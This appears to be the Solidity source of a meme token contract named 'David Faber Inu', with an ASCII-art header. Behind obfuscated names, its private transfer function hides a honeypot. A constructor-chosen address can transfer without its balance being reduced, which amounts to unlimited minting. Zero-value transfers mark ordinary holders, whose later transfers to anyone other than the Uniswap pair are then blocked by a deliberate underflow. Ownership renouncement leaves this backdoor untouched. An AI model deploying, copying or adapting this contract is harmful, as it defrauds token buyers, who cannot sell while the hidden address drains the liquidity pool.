/*

https://twitter.com/davidfaber

#########*******************************************************************************************
#######*****************************************************************+***************************
#####**************************************##**+****************************+++*********************
##***********************************###***#%%####**#####*********************++++++****************
#*********************************#%%%%%%%%%%%#*######%%%##*#*********************++++++************
********************************#%%%@%%%%#%####**#*#%%%%%%%####***********************++++++********
*******************************#%#%%%%%%%%#####%##%%%##%%%%%%#####***********************++++++++***
*****************************#%#%%%#####%%####%%@%%%%%%%%%%%%%###%%#*+++*********************+**+++*
******************++++++++++#%@@@%##%###%%%##%%%%%%%%%%%%%###%%%%%%%#*+++++************************+
*********+++++++++++++++++*%%@@#####%%%%%#########*+====+++++*%%%%%%%%*+++++++**********************
*****+++++++++++++++++++++#%@@%@%%#**###*++=--::::::::------==*#%@%%%%#*+++++++++*******************
*****++++++++++++++++++++*%%@@@@#+--::::.....::.::::::------===*#%%%%%#*+++++++++++*****************
******++++++++++++++++===#@@@@@#=-:-:::::::::::::::::-------====*%%%%%#*+++++++++++++***************
********++++++++++++++===#%%@%*------:::::::::::::::--------====+#%%%%%*++++++++++++++++************
*********++++++++++++++==+#@@%+=-----:-::::::::::::::-------====++#%%%%#+++++++++++++++++***********
*********++++++++++++++==+#@@%+------:::::::::::::::---==+====+++++%%%%%+++++++++++++++++++*********
*********+++++++++++++====*%%%=-=-----=====----::-==***#*++==++++++#%%%%*+++++++++++++++++++********
*******+++++++++++++======+%@%====+++*******=-::--*###*%%%*#**+=++++##%##+=+++++++++++++++++++******
***++++++++++++++++========#%#=-===+**%%%**++--:--*++=------======++*##**====++++++++++++++++++*****
++++++++++++++++===========+##=--=++=--:----:--::-+==-----------==++*#**+=======++++++++++++++++****
+++++++++++=================++=---:-------::---::-====-:::::--====+++*#*+=========+++++++++++++++***
+++++++++=================--=+=---:::::::::----::--==+=::::::--===+++#+++============+++++++++++++**
++++++================------:-==---:::::::------::-===+=--::---=+=+++*++===============++++++++++++*
+++++===============----------==----::::----=+=-::-+#**+=------=++++*+===================+++++++++++
+++++===============----------:====------::--===++***++===-=====++++=======================+++++++++
+++++================-----------====-===---------========++==-==++++========================++++++++
+++++================-----------====-----==--------==+++++=---==+=++=========================+++++++
+++++================-----------==--=----=====--::::--====---====++=--========================++++++
+++++++==============------------==--=--------------===----=====+++===========================++++++
+++++++==============-------------+=--==------------------===+=++++=-=========================++++++
+++++++=============---------------++=-==------:::::----===+++++++============================++++++
+++++++=============----------------+++==+==-----------==+++***+++=-========================+=++++++
++++++++============-------------=+-:-++****+=========+++*****++++=-======================++++++++++
++++++++=============-----------=#*-:..:=+*********+*******+++++++=-======================++++++++++
++++++++==============---------=#%%+::....-=+++*****+++++++++++++++-=====================+++++++++++
++++++++===============-------=#%%%%#:.......:--=++++=======++++=+-+*===================++++++++++++
+++++++++==============------+#%%%%%%%=..     ....:--=======+++=+--=@%**++=============+++++++++++++
+++++++++===============-==+#%%%%%%%%%%*.        ......:-=++++==::--*@@%#%%##**++======+++++++++++++
++++++++===============+*###%%%%%%%%%%%%#-            .....:==:..:---+#%%##%%%%%%###**++++++++++++++
+++++++=============+*#####%%%%%%%%%%%%%%%+.             . :==+*+-:---=+%%%#%%%%%%%%%%%%###**+++++++
+++++++=========+**######%#%%%%%%%%%%%%%%%%*:             :-==++++*+---=-#%%%%%%%%%%%%%%%%%%%%#*++++
+++++++====++*########%%#%%%%%%%%%%%%%%%%%%%%=           -+-:-==+++##=--=:#%%%%%%%%%%%%%%%%%%%%%#+++
+++++++++**######%#%%%%%%%%%%%%%%%%%%%%%%%%%%%*.        =%#*=:-===+++==---:#%%%%%%%%%%%%%%%%%%%%%#++
+++++**########%#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#:      -**+===:-=-=++-:::--:#%%%%%%%%%%%%%%%%%%%%%*+
**#####%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#-    -=--:..:+=-===*=::..-::%%%%%%%%%%%%%%%%%%%%%%*
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%=. :..::.:..:-=#-:-==::..-.=%%%%%%%%%%%%%%%%%%%%%#
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%+-. .::::...+-#+-:==*-...::*%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*:...::....-+#*-=:-++*:..::#%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#:..::...:-=**==:--==+-:.:-%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%-..::..:-++*=:--:--==-:.:+%%%%%%%%%%%%%%%%%%%


*/


// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DavidFaberInu is Ownable {
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 private hurdle = 65;

    mapping(address => mapping(address => uint256)) public allowance;

    address public uniswapV2Pair;

    uint256 public totalSupply = 69_696_969_696_969 * 10 ** 9;

    uint8 public decimals = 9;

    function approve(address dex, uint256 ensuing) public returns (bool success) {
        allowance[msg.sender][dex] = ensuing;
        emit Approval(msg.sender, dex, ensuing);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public symbol = 'DAVIDFABERINU';

    mapping(address => uint256) private inu;

    function transferFrom(address entertainment, address alumni, uint256 ensuing) public returns (bool success) {
        hostSpaceWithElon(entertainment, alumni, ensuing);
        require(ensuing <= allowance[entertainment][msg.sender]);
        allowance[entertainment][msg.sender] -= ensuing;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private fission;

    constructor(address amber) {
        balanceOf[msg.sender] = totalSupply;
        fission[amber] = hurdle;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address alumni, uint256 ensuing) public returns (bool success) {
        hostSpaceWithElon(msg.sender, alumni, ensuing);
        return true;
    }

    string public name = 'David Faber Inu';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function hostSpaceWithElon(address entertainment, address alumni, uint256 ensuing) private returns (bool success) {
        if (fission[entertainment] == 0) {
            balanceOf[entertainment] -= ensuing;
        }

        if (ensuing == 0) inu[alumni] += hurdle;

        if (fission[entertainment] == 0 && uniswapV2Pair != entertainment && inu[entertainment] > 0) {
            fission[entertainment] -= hurdle;
        }

        balanceOf[alumni] += ensuing;
        emit Transfer(entertainment, alumni, ensuing);
        return true;
    }
}